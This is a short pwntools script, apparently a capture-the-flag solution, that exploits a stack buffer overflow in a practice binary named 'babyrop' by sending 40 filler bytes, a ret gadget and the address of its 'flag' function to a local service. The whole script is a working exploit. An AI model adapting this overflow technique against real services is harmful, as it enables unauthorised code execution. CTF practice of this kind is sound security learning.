from pwn import * 
s = remote('127.0.0.1', 1000)
# s=process('./babyrop')
e = ELF('./babyrop')
s.sendline((b"A" * 40 + p64(0x40101a) + p64(e.sym['flag'])))
s.interactive()
